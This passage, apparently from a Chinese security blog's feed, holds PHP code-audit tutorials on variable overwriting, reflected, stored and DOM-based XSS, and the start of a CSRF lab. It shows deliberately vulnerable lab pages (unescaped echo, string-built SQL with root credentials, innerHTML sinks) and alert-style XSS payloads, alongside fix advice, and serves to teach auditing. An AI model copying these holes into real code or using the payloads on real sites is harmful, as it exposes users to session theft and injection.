language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">240610708</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201206221428780.png" alt="在这里插入图片描述"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>在php.ini中设置register_globals=OFF</li><li>使用原始变量数组，如$_POST，$_GET等数组进行变量操作</li><li>不使用foreach语句来遍历$_GET变量，而改用[(index)]来指定</li><li>验证变量是否存在，注册变量前先判断变量是否存在</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 变量覆盖 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：XSS漏洞</title>
      <link href="/posts/85b3150f.html"/>
      <url>/posts/85b3150f.html</url>
      
        <content type="html"><![CDATA[<h3 id="xss攻击"><a href="#xss攻击" class="headerlink" title="xss攻击"></a>xss攻击</h3><blockquote><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p></blockquote><h3 id="xss的危害"><a href="#xss的危害" class="headerlink" title="xss的危害"></a>xss的危害</h3><ul><li>窃取管理员帐号或Cookie，入侵者可以冒充管理员的身份登录后台。使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息</li><li>窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作</li><li>网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马</li><li>发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用</li></ul><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><p><strong>黑盒测试</strong>：</p><ul><li>一般对一些留言板、搜索框、文章发表、用户资料修等等改这些地方进行测试</li><li>总之就是有数据交互的地方，试一试就行了</li></ul><p><strong>白盒审计</strong></p><ul><li>用户输入参数：GET POST …</li><li>函数</li><li>输入到输出是否有过滤？</li></ul><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><p>说实话我个人认为这个反射型的xss利用价值不是很高，这个也叫非持久性xss。顾名思义，我们把payload夹在存在漏洞的url里，发送给管理员，诱导他点击这个链接，而且还必须是在登录管理员账号的情况下，打到的cookie才好使。</p><p>有一些特殊情况下，反射型xss的危害也是不容小觑，比如在name的输入框中插入</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>refresh<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这段数据传输到浏览器中，网站每3秒会刷新一次，严重会引起服务器崩溃</p><h4 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h4><ul><li>将前端获取的内容，直接输出到浏览器中</li><li>将前端获取的内容，直接输出到HTML标签</li><li>将前端获取的内容，直接输出到&lt;script&gt;标签</li></ul><p>这里举一个很简单的例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127155136510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还有一种情况也是比较多见的，需要我们自己去闭合标签：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup">&lt;input type="text" value="<span class="token prolog">&lt;?php echo $id?></span></span>"<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里闭合前面的value，然后插入我们的js代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span>"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127160526104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>最后一种，闭合js标签进行反弹xss：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>    <span class="token keyword">var</span> xss <span class="token operator">=</span> <span class="token string">'&lt;?php echo $id?>'</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>xss<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127161259372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">123</span><span class="token operator">%</span><span class="token number">27</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>它跟反射型xss的区别就是将数据储存在服务端中，当我们再次访问服务端的时候，就会触发xss，这种也叫持久性xss。</p><p>我这写了一个页面，可以储存也可以读取，来测试一下是不是写进去了，并且每次调用写入数据时，页面的变化：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$xss</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'xss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$conne</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$xss</span> <span class="token keyword">and</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO XSS(id,payload) values ('$id','$xss')"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conne</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cunchu.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token constant">ID</span>：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    留言：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>xss<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cunchu.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    留言查询：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>查询<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'info'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$conne</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM XSS WHERE id=$id"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conne</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"留言内容："</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'ID: '</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">'Payload: '</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;br>&lt;hr>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问一下：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127165418633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里测试成功，我们直接写一个xss代码进去：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查一下id，成功弹框：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127165754389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="存储型与反射型的区别"><a href="#存储型与反射型的区别" class="headerlink" title="存储型与反射型的区别"></a>存储型与反射型的区别</h4><pre><code>存储型xss        输入--进入数据库--取出数据--输出反射型xss        输入--输出</code></pre><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="什么是DOM型xss"><a href="#什么是DOM型xss" class="headerlink" title="什么是DOM型xss"></a>什么是DOM型xss</h4><blockquote><p>DOM，是一个平台和语言都中立的接口，可以使程序和脚本都能动态访问和更新程序文档的内容、结构以及样式。<br><br>DOM型xss其实是一种特殊类型的xss，它基于DOM文档对象模型的一种漏洞。</p></blockquote><h4 id="DOM型常见属性"><a href="#DOM型常见属性" class="headerlink" title="DOM型常见属性"></a>DOM型常见属性</h4><table><thead><tr><th>输入点</th><th>输出点</th></tr></thead><tbody><tr><td>document.URL</td><td>eval</td></tr><tr><td>document.location</td><td>document.write</td></tr><tr><td>document.referrer</td><td>document.InnterHTML</td></tr><tr><td>document.form</td><td>document.OuterHTML</td></tr><tr><td>……</td><td>…</td></tr></tbody></table><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里我写一个简单的表单：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$xss</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'xss'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup">&lt;input type="text" id="text" value="<span class="token prolog">&lt;?php echo $xss;?></span></span>"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>print<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token keyword">var</span> text <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token keyword">print</span> <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"print"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> text<span class="token punctuation">.</span>value<span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以试一下，我们的xss语句被插到了哪里<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201128092240315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>插到了div标签中：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201128092611588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>DOM型xss数据流向</strong></p><pre><code>URL --&gt;  浏览器</code></pre><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>对输入的script、iframe等字样进行严格过滤</li><li>验证数据的内类型其格式、长度、范围和内容</li><li>客户端做数据的过滤，关键的步骤在服务端进行</li><li>检查输出的数据</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：CSRF漏洞</title>
      <link href="/posts/c29311d.html"/>
      <url>/posts/c29311d.html</url>
      
        <content type="html"><![CDATA[<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><blockquote><p>CSRF跨站点请求伪造(Cross—Site Request Forgery)，跟XSS攻击一样，存在巨大的危害性，你可以这样来理解：<br>       攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</p></blockquote><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><blockquote><p>修改用户信息，如用户的头像、发货地址等。更有甚者，可能执行恶意操作，比如修 改密码、添加/删除好友或者点赞/转发/评论/私信。</p></blockquote><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><ul><li><strong>后台功能模块：管理后台、用户中心、添加用户等</strong></li><li>被引用的核心文件里面有没有验证Token和referer的相关代码</li><li>没带Token：可以直接请求这个页面</li><li>没带referer：返回相同的数据</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>我们先来写几个简单的页面，用来测试csrf。</p><p>conn.php:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token string">"SET NAMES GB2312"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>index.html：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>用户登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    密 码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token 